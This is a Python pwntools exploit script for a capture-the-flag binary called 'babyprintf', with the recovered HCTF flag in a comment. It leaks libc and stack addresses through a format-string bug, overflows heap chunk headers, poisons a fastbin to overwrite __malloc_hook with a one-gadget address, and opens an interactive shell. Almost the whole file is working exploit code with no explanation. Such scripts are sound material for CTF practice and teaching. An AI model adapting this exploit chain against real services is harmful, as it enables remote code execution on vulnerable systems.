from pwn import *
from ctypes import *

from pwn_debug.pwn_debug import *
from pwn_debug.IO_FILE_plus import *
pdbg=pwn_debug("./babyprintf")

#pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local()
pdbg.debug("2.24")
pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
elf=pdbg.elf
libc=pdbg.libc

    
def pwn():
    #gdb.attach(p, "b *0x4007D2")#8048F40 ")
    
    data='%1$da'+'%2$da'+'%3$da'+'%4$da'+'%5$dbb'+'%6$llda'+'%7$dcc'+'%8$llda'
    p.recvuntil('size: ')
    p.sendline(str(0x1000-0x10))
    p.recvuntil('string: ')
    p.sendline(data)
    p.recvuntil('bb')
    libc_start_main_addr=int(p.recvuntil('a')[:-1])
    #print stack_addr
    p.recvuntil('cc')
    stack_addr=int(p.recvuntil('a')[:-1])
    #print heap_addr
    print hex(stack_addr),hex(libc_start_main_addr)
    
    libc_base=libc_start_main_addr-libc.symbols['__libc_start_main']-241
    print hex(libc_base)
    system_addr=libc_base+libc.symbols['system']
    bin_sh_addr=libc_base+next(libc.search('/bin/sh'))
    malloc_hook = libc_base + libc.symbols["__malloc_hook"]
    print hex(malloc_hook)
    
    for i in range (0,31):
        p.recvuntil('size: ')
        p.sendline(str(0x1000-0x10))
        data='a'*0x20+p64(0)+p64(0xf91)
        p.recvuntil('string: ')
        p.sendline(data)
    #raw_input()
    pdbg.bp(0x4007d2)
    p.recvuntil('size: ')
    p.sendline(str(0x1000-0x80-0x10))
    data='\x00'*(0x1000-0x10-0x80)+p64(0)+p64(0x81)
    p.recvuntil('string: ')
    p.sendline(data)
    
    p.recvuntil('size: ')
    p.sendline(str(0x1000-0x90-0x10))
    data='\x00'*(0x1000-0x10-0x90)+p64(0)+p64(0x91)
    p.recvuntil('string: ')
    p.sendline(data)
    
    p.recvuntil('size: ')
    p.sendline(str(0x1000-0x90-0x10))
    data='\x00'+p64(0)+p64(0x91)
    p.recvuntil('string: ')
    p.sendline(data)
    #
    

    p.recvuntil('size: ')
 
    p.sendline(str(80))
    fd_ptr=p64(malloc_hook - 0x1b - 8)
    print hex(malloc_hook - 0x1b - 8)
    data='\x00'*0x1fe0+p64(0)+p64(0x71)+fd_ptr
    p.recvuntil('string: ')
    p.sendline(data)
    
    p.recvuntil('size: ')
 
    p.sendline(str(96))
    data='\x00'*8
    p.recvuntil('string: ')
    p.sendline(data)

    rce=libc_base+0x4557a
    print hex(rce)
    p.recvuntil('size: ')
    p.sendline(str(96))
    data='\x00'*8
    p.recvuntil('string: ')
    data='a'*19+p64(rce)
    p.sendline(data)
    #gdb.attach(p, "b *0x4007D2")
    p.recvuntil('size: ')
    p.sendline(str(100))
    p.interactive()
#hctf{052ec45284f5ce1f20ea611b5f5f24fda05924552054a60799c10d7c6b497e35}

#0x1b37000:	0x0000000000000000	0x0000000000021001
#0x1b37010:	0x0000000000000000	0x0000000000000000
#0x21df000:	0x0000000000000000	0x0000000000002001
if __name__ == '__main__':
   pwn()



 

    

